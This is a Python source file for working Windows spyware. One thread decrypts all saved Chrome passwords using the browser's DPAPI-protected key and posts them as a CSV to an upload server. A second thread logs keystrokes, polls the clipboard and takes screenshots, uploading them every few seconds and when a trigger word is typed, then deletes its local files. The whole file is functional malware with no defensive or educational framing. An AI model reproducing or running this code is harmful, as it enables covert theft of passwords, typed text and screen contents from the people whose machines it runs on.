import pynput
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import pyautogui
from datetime import datetime, timedelta
import schedule
import time
import threading
import pyperclip


def google():
    # GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data\Local State"
        % (os.environ["USERPROFILE"])
    )
    CHROME_PATH = os.path.normpath(
        r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ["USERPROFILE"])
    )

    def get_secret_key():
        try:
            # (1) Get secretkey from chrome local state
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[
                1
            ]
            return secret_key
        except Exception as e:
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    if __name__ == "__main__":
        try:
            # Create Dataframe to store passwords
            with open(
                "decrypted_password.csv", mode="w", newline="", encoding="utf-8"
            ) as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=",")
                csv_writer.writerow(["index", "url", "username", "password"])
                # (1) Get secret key
                secret_key = get_secret_key()
                # Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [
                    element
                    for element in os.listdir(CHROME_PATH)
                    if re.search("^Profile*|^Default$", element) != None
                ]
                for folder in folders:
                    # (2) Get ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(
                        r"%s\%s\Login Data" % (CHROME_PATH, folder)
                    )
                    conn = get_db_connection(chrome_path_login_db)
                    if secret_key and conn:
                        cursor = conn.cursor()
                        cursor.execute(
                            "SELECT action_url, username_value, password_value FROM logins"
                        )
                        for index, login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if url != "" and username != "" and ciphertext != "":
                                # (3) Filter the initialisation vector & encrypted password from ciphertext
                                # (4) Use AES algorithm to decrypt the password
                                decrypted_password = decrypt_password(
                                    ciphertext, secret_key
                                )
                                csv_writer.writerow(
                                    [index, url, username, decrypted_password]
                                )
                        # Close database connection
                        cursor.close()
                        conn.close()
                        # Delete temp login db
                        os.remove("Loginvault.db")
                        os.system(
                            f'curl -S -X POST -F "file=@decrypted_password.csv" http://localhost:5000/upload'
                        )
                        os.system("decrypted_password.csv")
        except Exception as e:
            print("[ERR] %s" % str(e))


global cerrar
cerrar = False


def back():
    # key
    teclas = []
    nombre_archivo = "teclas.txt"
    cadena_a_buscar = "wilches"
    global hora_inicio
    hora_inicio = datetime.now()

    def captura():
        width, height = pyautogui.size()
        screenshot = pyautogui.screenshot()
        hora_actual = datetime.now().strftime("%H-%M-%S")
        screenshot.save(f"captura${hora_actual}.png")

        os.system(
            f'curl -X POST -F "file=@captura${hora_actual}.png" http://localhost:5000/upload'
        )

        os.remove(f"captura${hora_actual}.png")

    def actualizarArchivo():
        with open(nombre_archivo, "w") as archivo:
            archivo.write("".join(teclas))
            archivo.close()
        with open(nombre_archivo, "r") as archivo:
            contenido = archivo.read()
            if cadena_a_buscar in contenido:
                captura()
                os.system(
                    f'curl -S -X POST -F "file=@{nombre_archivo}" http://localhost:5000/upload'
                )
                global cerrar
                cerrar = True
                sys.exit()
            archivo.close()

    def portapa():
        global contenido_portapapeles
        contenido_portapapeles = pyperclip.paste()
        while cerrar == False:
            contenido_portapapeless = pyperclip.paste()
            if (
                contenido_portapapeless != ""
                and contenido_portapapeless != contenido_portapapeles
            ):
                teclas.append(f"\f clipboard: " + contenido_portapapeles + f"\n")
                contenido_portapapeles = contenido_portapapeless
            time.sleep(10)
        sys.exit()

    tarea_porta = threading.Thread(target=portapa)
    tarea_porta.start()

    def com_horu():
        global hora_inicio 
        hora_actual = datetime.now()
        diferencia = hora_actual - hora_inicio

        if diferencia > timedelta(seconds=10):
            hora_inicio = datetime.now()

            os.system(
                f'curl -S -X POST -F "file=@{nombre_archivo}" http://localhost:5000/upload 2>&1'
            )

    def presionarT(tecla):
        if hasattr(tecla, "char"):
            tecla = tecla.char
        elif tecla == pynput.keyboard.Key.space:
            tecla = " "
        elif tecla == pynput.keyboard.Key.enter:
            captura()
            hora_actual = datetime.now().strftime("%H-%M-%S")
            tecla = f"\n{hora_actual} "
        elif tecla in (pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r):
            tecla = " <Shift> "
        elif tecla in (pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r):
            tecla = " <Alt> "
        elif tecla == pynput.keyboard.Key.tab:
            tecla = " <Tab> "
        elif tecla == pynput.keyboard.Key.down:
            tecla = " < Down >"
        elif tecla == pynput.keyboard.Key.up:
            tecla = " < Up >"
        elif tecla == pynput.keyboard.Key.left:
            tecla = " < Left >"
        elif tecla == pynput.keyboard.Key.right:
            tecla = " < Right >"
        elif tecla == pynput.keyboard.Key.esc:
            tecla = " <Esc> "
        elif tecla == pynput.keyboard.Key.ctrl_l:
            tecla = " <Ctr L> "
        elif tecla == pynput.keyboard.Key.ctrl_r:
            tecla = " <Ctr R> "
        elif tecla == pynput.keyboard.Key.alt_gr:
            tecla = " <Alt gr> "
        elif tecla == pynput.keyboard.Key.alt_l:
            tecla = " <Alt> "
        elif tecla == pynput.keyboard.Key.cmd:
            tecla = " <Win> "
        elif tecla == pynput.keyboard.Key.backspace:
            if teclas:
                teclas.pop()  # Eliminar el último carácter
            actualizarArchivo()
            return
        else:
            tecla = str(tecla)
        teclas.append(tecla)
        com_horu()
        actualizarArchivo()

    with pynput.keyboard.Listener(on_press=presionarT) as escuchador:
        escuchador.join()


# back
hilo_1 = threading.Thread(target=back)
hilo_1.start()

# google
hilo_2 = threading.Thread(target=google)
hilo_2.start()
hilo_2.join()
os.remove("decrypted_password.csv")
